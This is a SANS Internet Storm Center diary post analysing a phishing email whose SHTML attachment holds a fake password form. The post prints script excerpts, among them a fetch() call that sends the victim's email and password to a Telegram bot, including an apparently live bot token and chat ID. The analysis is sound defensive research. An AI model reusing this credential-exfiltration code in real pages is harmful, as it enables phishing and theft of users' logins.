---
title: Self-contained HTML phishing attachment using Telegram to exfiltrate stolen credentials, (Mon, Oct 28th)
url: https://isc.sans.edu/diary/rss/31388
source: SANS Internet Storm Center, InfoCON: green
date: 2024-10-29
fetch_date: 2025-10-06T18:55:23.157547
---

# Self-contained HTML phishing attachment using Telegram to exfiltrate stolen credentials, (Mon, Oct 28th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31384)
* [next](/diary/31390)

# [Self-contained HTML phishing attachment using Telegram to exfiltrate stolen credentials](/forums/diary/Selfcontained%2BHTML%2Bphishing%2Battachment%2Busing%2BTelegram%2Bto%2Bexfiltrate%2Bstolen%2Bcredentials/31388/)

**Published**: 2024-10-28. **Last Updated**: 2024-10-28 07:13:03 UTC
**by** [Jan Kopriva](/handler_list.html#jan-kopriva) (Version: 1)

[0 comment(s)](/diary/Selfcontained%2BHTML%2Bphishing%2Battachment%2Busing%2BTelegram%2Bto%2Bexfiltrate%2Bstolen%2Bcredentials/31388/#comments)

Phishing authors have long ago discovered that adding HTML attachments to the messages they send out can have significant benefits for them – especially since an HTML file can contain an entire credential-stealing web page and does not need to reach out to the internet for any other reason than to send the credentials a victim puts in a login form to an attacker-controlled server[[1](https://isc.sans.edu/diary/Phishing%2Bwith%2Ba%2Bselfcontained%2Bcredentialsstealing%2Bwebpage/25580)]. Since this approach can be significantly more effective than just pointing recipients to a URL somewhere on the internet, the technique of sending out entire credential-stealing pages as attachments has become quite commonplace.

![](https://isc.sans.edu/diaryimages/images/24-10-28-page.png)

However, even though threat actors have been experimenting with variations on the “self-contained HTML phishing attachment” formula for many years now, one can still come across HTML attachments which are interesting or unusual for some reason. And, in fact, I found one such attachment while I was going over phishing messages that were delivered to our handler inbox over the past week.

The e-mail message which carried the attachment looked like any other phishing…

[![](https://isc.sans.edu/diaryimages/images/24-10-28-mail.png)](https://isc.sans.edu/diaryimages/images/24-10-28-mail.png)

…the attachment was somewhat more unusual, however.

The attached file had a SHTML extension (the extension was probably changed in an attempt to get past basic filters looking for the “.html” string) and was entirely made up of three script tags and their contents.

The first script, as you may see, was only intended to set the e-mail address of the recipient.

```

<script>
     let zhe = [e-mail address of the recipient];
</script>
```

The second script contained a URL-encoded body of the actual page, which was fairly basic – it was only intended to display a simple form with a password prompt.

```

<script language="javascript">
document.write(unescape('%3C%68
...
%0A%20'));
</script>
```

[![](https://isc.sans.edu/diaryimages/images/24-10-28-page.png)](https://isc.sans.edu/diaryimages/images/24-10-28-page.png)

The third script, which implemented the actual mechanism for sending credentials to the attacker, was the interesting one. First, because it wasn’t obfuscated in any way, but mainly because it didn’t send the e-mail and password combination to an attacker-controlled server, as one might expect, but rather to a Telegram channel. It did so using a simple GET request to api.telegram.org, as the following excerpt shows…

```

<script type="text/javascript">
	...
	 window.addEventListener('load', () => {
		emailGrab.textContent = zhe;
	 });
	  let xyz = 6232213176;
	let yxz = '6274096448:AAFIuDO3z8WR4lglrmpW3RvReWlVaHQVYJ0';
	function telegramApi(method, id, message) {
		 fetch(`https://api.telegram.org/bot${yxz}/${method}?chat_id=${id}&text=${message}&parse_mode=HTML`);
	}
		button.addEventListener('click', () => {
			const results = `Adobe EmailAddress: ${emailGrab.textContent} Adobe Password: ${passInput.value}`;
		if (passInput.value === '') {
				alert('The Following error(s) occured - Password Required')
			}
			else {
				 telegramApi('sendMessage', xyz, results);
				 ...
		}
		});
		...
</script>
```

While the use of Telegram by threat actors is not new by any stretch, I have never before come across this specific combination of a phishing message with an HTML attachment that contains a JavaScript-based credential stealing page that sends the stolen credentials to a Telegram channel…

And even though I’m quite certain that it is not the first time that this approach has been used in the wild, this campaign provides a good reminder that Telegram and other messaging systems can be used for fairly low-visibility data exfiltration, if an organization doesn’t have these vectors properly monitored or blocked outright (e.g., using DNS-level or URL-level filtering).

[1] [https://isc.sans.edu/diary/Phishing+with+a+selfcontained+credentialsstealing+webpage/25580](https://isc.sans.edu/diary/Phishing%2Bwith%2Ba%2Bselfcontained%2Bcredentialsstealing%2Bwebpage/25580)

-----------
Jan Kopriva
[@jk0pr](https://twitter.com/jk0pr) | [LinkedIn](https://www.linkedin.com/in/jan-kopriva/)
[Nettles Consulting](https://www.nettles.cz/)

Keywords:

[0 comment(s)](/diary/Selfcontained%2BHTML%2Bphishing%2Battachment%2Busing%2BTelegram%2Bto%2Bexfiltrate%2Bstolen%2Bcredentials/31388/#comments)

* [previous](/diary/31384)
* [next](/diary/31390)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)